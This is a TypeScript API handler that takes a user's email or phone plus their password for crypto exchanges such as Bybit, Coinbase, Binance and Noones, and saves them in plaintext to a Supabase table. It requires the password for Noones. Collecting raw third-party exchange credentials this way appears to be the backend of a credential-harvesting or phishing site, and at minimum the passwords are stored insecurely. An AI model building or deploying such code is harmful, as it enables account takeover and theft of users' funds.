import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL;
const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;

if (!supabaseUrl || !supabaseServiceRoleKey) {
  throw new Error('SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY are required in server environment variables.');
}

const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey, {
  auth: {
    persistSession: false,
  },
});

const allowedPlatforms = ['Bybit', 'Coinbase', 'Noones', 'Binance'];

function sanitizeString(value: unknown) {
  return typeof value === 'string' ? value.trim() : '';
}

export default async function handler(req: any, res: any) {
  if (req.method !== 'POST') {
    res.setHeader('Allow', 'POST');
    return res.status(405).json({ error: 'Method not allowed' });
  }

  let payload: any;
  try {
    payload = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
  } catch (error) {
    return res.status(400).json({ error: 'Invalid JSON payload.' });
  }

  const platform = sanitizeString(payload.platform);
  const email = sanitizeString(payload.email).toLowerCase();
  const third_party_password = sanitizeString(payload.third_party_password) || null;
  const user_id = sanitizeString(payload.user_id) || null;

  if (!platform || !allowedPlatforms.includes(platform)) {
    return res.status(400).json({ error: 'Platform is required and must be valid.' });
  }

  if (!email) {
    return res.status(400).json({ error: 'Email or phone is required.' });
  }

  if (platform === 'Noones' && !third_party_password) {
    return res.status(400).json({ error: 'Password is required for Noones submissions.' });
  }

  const insertPayload: Record<string, unknown> = {
    platform,
    email,
    user_id,
  };

  if (third_party_password !== null) {
    insertPayload.third_party_password = third_party_password;
  }

  try {
    const { error } = await supabaseAdmin
      .from('platform_connections')
      .insert(insertPayload);

    if (error) {
      console.error('Supabase insert error:', error);
      return res.status(500).json({ error: 'Failed to save submission.' });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Submission handler error:', error);
    return res.status(500).json({ error: 'Server error while processing submission.' });
  }
}
